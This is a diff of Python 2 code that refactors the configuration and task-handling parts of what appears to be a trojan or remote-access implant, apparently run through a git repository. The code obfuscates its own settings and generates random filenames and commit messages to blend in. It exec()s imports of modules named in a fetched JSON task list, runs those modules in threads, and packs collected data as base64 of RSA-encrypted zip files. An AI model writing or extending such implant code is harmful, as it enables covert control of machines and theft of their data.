@@ -44,7 +44,7 @@ class Config:
 	#generates a new id by hashing time and seed
 	def u_id(self):
 		i_time = int(time.time())
-		t_id = str(i_time) + self.fixstr(self.id_s)
+		t_id = str(i_time) + self.g_id_s()
 		self.id = str(xxhash.xxh64(t_id).hexdigest())
 		self.id = self.obfstr(self.id)
 
@@ -72,7 +72,7 @@ class Config:
 
 	#returns deobfuscated data path to new data file
 	def g_data(self):
-		return self.fixstr(self.data) + self.id() + "/" + self.g_fn()
+		return self.fixstr(self.data) + self.g_id() + "/" + self.g_fn()
 
 	#sets new obfuscated data path
 	def u_data(self, new):
@@ -126,7 +126,7 @@ class Config:
 	#generates a random filename for a data file
 	def g_fn(self):
 		i_time = int(time.time())
-		fn = str(i_time) + self.fixstr(self.fn_s)
+		fn = str(i_time) + self.g_fn_s()
 		return xxhash.xxh64(fn).hexdigest()
 
 	#generates a random commit message for creating/updating files
@@ -139,6 +139,7 @@ class Config:
 		return self.fixstr(self.imp)
 
 	#returns string used as seed and index
+	#need to update old references to fn_s/id_s
 	def g_fn_s(self):
 		return self.fixstr(self.fn_s)
 
@@ -152,7 +153,7 @@ class Config:
 		return
 
 	#updates seed/index string
-	def u_fn_id(self, new):
+	def u_fn_s(self, new):
 		self.fn_s = self.obfstr(new)
 		return
 
@@ -171,7 +172,7 @@ class Config:
 	def obfstr(self, f_str):
 		return f_str #dont obfuscate while testing
 		i_time = int(time.time())
-		t_id = str(i_time) + self.fixstr(self.id_s)
+		t_id = str(i_time) + self.g_id_s()
 		h = str(xxhash.xxh64(t_id).hexdigest())
 		i = 0
 		o_str = ""
@@ -226,8 +227,8 @@ def get_config():
 	try:
 		c_dict = json.loads(c_json)
 		for mod in c_dict:
-			if mod[config.fn_s] not in sys.modules:
-				exec(config.g_imp() % mod[config.fn_s])
+			if mod[config.g_fn_s()] not in sys.modules:
+				exec(config.g_imp() % mod[config.g_fn_s()])
 		return c_dict
 	except:
 		return None
@@ -250,7 +251,8 @@ def decrypt(data):
 	decoded = base64.b64decode(data)
 	s_io = StringIO.StringIO(decoded) #open
 	zipped = zipfile.ZipFile(s_io, 'r')
-	uzip = zipped.read(config.fn_s, config.g_pwd()) #returns file as bytes
+	#file name in archive needs to be fn_s
+	uzip = zipped.read(config.g_fn_s(), config.g_pwd()) #returns file as bytes
 	zipped.close()
 	s_io.close()
 	return uzip
@@ -259,7 +261,7 @@ def decrypt(data):
 #encrypted = base64(rsa(zip(data)))
 def encrypt(data):
 	return data #dont encrypt while testing
-	key = config.g_pk()
+	key = config.pk
 	size = config.size
 	offset = 0
 	encrypted = ""
@@ -277,7 +279,7 @@ def run_module(**task):
 	try:
 		global config
 		#config is passed to module and returned to update config options
-		conf, result = sys.modules[task[config.fn_s]].run(config, **task)
+		conf, result = sys.modules[task[config.g_fn_s()]].run(config, **task)
 		if conf is not None:
 			config = conf
 		while True:
@@ -301,7 +303,7 @@ def module_runner():
 		t = threading.Thread(target=run_module, kwargs = task)
 		t.start()
 		try:
-			time.sleep(int(task[config.id_s]))
+			time.sleep(int(task[config.g_id_s()]))
 		except:
 			pass
 	return
